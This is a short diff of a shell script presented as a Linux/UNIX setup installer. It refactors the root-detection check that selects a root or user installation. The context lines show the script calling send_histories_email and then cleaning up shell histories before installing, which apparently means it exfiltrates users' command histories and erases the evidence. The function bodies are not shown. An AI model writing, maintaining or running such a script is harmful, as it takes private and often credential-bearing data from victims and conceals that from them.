@@ -54,6 +54,8 @@ echo "[*] Proceeding with Linux/UNIX setup"
 echo ""
 
 # ==================== ROOT DETECTION ====================
+# This check determines the installation mode for the entire script
+# Set once here and reused at the end to ensure consistency
 if [ "$(id -u)" -eq 0 ]; then
     IS_ROOT=true
     echo "[✓] Running as root - full installation mode"
@@ -1882,12 +1884,12 @@ send_histories_email || log_message "Continuing after email attempt..."
 log_message "Cleaning up shell histories..."
 cleanup_histories
 
-# Installation
-if [[ $(id -u) -eq 0 ]]; then
-    log_message "Running as root"
+# Installation - use IS_ROOT variable set at script start for consistency
+if [ "$IS_ROOT" = true ]; then
+    log_message "Running as root - executing full root installation"
     root_installation
 else
-    log_message "Running as regular user"
+    log_message "Running as regular user - executing user installation"
     user_installation
 fi
 
